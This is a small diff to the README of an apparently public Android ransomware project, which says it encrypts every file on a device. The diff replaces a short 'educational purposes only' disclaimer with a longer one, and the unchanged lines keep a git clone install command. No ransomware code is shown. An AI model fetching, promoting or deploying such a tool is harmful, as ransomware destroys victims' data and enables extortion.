@@ -4,7 +4,7 @@
 
 this is a simple android ransomware, it will encrypted all the files in your android device 😈
 ### Disclaimer
-This tool is made for education purpose only, the author is not responsible for any loses or damage caused by this programs
+⚠️ LEGAL DISCLAIMER: This project is strictly for educational purposes and ethical research. DO NOT use this code to attack systems without explicit, mutual authorization. The author is not responsible for any misuse or damage caused by this software. Use only in isolated, virtual environments (e.g., VMs or sandboxes).
 ### Installation
 
     git clone https://github.com/Shadow8021/darkwaves.git
